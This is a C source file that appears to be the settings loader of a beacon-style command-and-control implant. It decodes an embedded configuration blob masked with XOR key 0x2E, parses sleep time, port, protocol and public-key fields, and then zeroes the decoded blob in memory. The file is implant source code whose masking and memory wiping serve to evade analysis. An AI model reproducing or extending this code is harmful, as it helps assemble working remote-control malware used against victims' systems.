#include "beacon.h"
#include "parse.h"
#include "debug.h"
#include <stdlib.h>
#include <string.h>

#define TYPE_SHORT 1
#define TYPE_INT   2
#define TYPE_PTR   3

typedef struct {
    unsigned short type;
    unsigned int   length;
    union {
        unsigned short s_value;
        unsigned int   i_value;
        char          *p_value;
    } value;
} setting_t;

/* Baked by tools/insert_blob.py — must be exactly PATCH_SIZE bytes of data
 * after C string concatenation (no trailing content beyond XOR-masked blob). */
static const unsigned char baked_settings[] =
#include "settings_blob.inc"
;

char g_settings_blob[PATCH_SIZE];
static setting_t *settings;

static setting_t setting_get(int id) {
    setting_t z;
    memset(&z, 0, sizeof(z));
    if (!settings || id < 0 || id >= 128) return z;
    return settings[id];
}

unsigned short setting_short(int field) {
    setting_t v = setting_get(field);
    return v.type == TYPE_SHORT ? v.value.s_value : 0;
}

unsigned int setting_int(int field) {
    setting_t v = setting_get(field);
    return v.type == TYPE_INT ? v.value.i_value : 0;
}

char *setting_ptr(int field) {
    setting_t v = setting_get(field);
    return v.type == TYPE_PTR ? v.value.p_value : NULL;
}

unsigned int setting_len(int field) {
    setting_t v = setting_get(field);
    return v.type == TYPE_PTR ? v.length : 0;
}

void settings_init(void) {
    datap parser;
    short index, type, length;
    size_t n;
    int x;

    n = sizeof(baked_settings);
    /* If baked as C string, sizeof includes NUL — drop it when n==PATCH+1 */
    if (n == PATCH_SIZE + 1) n = PATCH_SIZE;
    if (n > PATCH_SIZE) n = PATCH_SIZE;
    memcpy(g_settings_blob, baked_settings, n);
    if (n < PATCH_SIZE)
        memset(g_settings_blob + n, 0x2E, PATCH_SIZE - n);

    settings = (setting_t *)calloc(128, sizeof(setting_t));
    if (!settings) return;

    for (x = 0; x < PATCH_SIZE; x++)
        g_settings_blob[x] ^= 0x2E;

    data_init(&parser, g_settings_blob, PATCH_SIZE);

    while (1) {
        index = (short)data_short(&parser);
        if (index <= 0) break;
        type   = (short)data_short(&parser);
        length = (short)data_short(&parser);
        if (index >= 128) break;

        settings[index].type = (unsigned short)type;
        settings[index].length = (unsigned int)length;
        switch (type) {
        case TYPE_SHORT:
            settings[index].value.s_value = data_short(&parser);
            break;
        case TYPE_INT:
            settings[index].value.i_value = data_int(&parser);
            break;
        case TYPE_PTR: {
            char *dst = (char *)malloc((size_t)length + 1);
            char *src = data_ptr(&parser, length);
            settings[index].value.p_value = dst;
            if (dst && src) {
                memcpy(dst, src, (size_t)length);
                dst[length] = '\0';
            }
            break;
        }
        default:
            data_ptr(&parser, length);
            break;
        }
    }

    memset(g_settings_blob, 0, PATCH_SIZE);
    DEBUG_PRINT("[settings] sleeptime=%u port=%u proto=%u pubkey_len=%u\n",
                setting_int(SETTING_SLEEPTIME),
                setting_short(SETTING_PORT),
                setting_short(SETTING_PROTOCOL),
                setting_len(SETTING_PUBKEY));
}
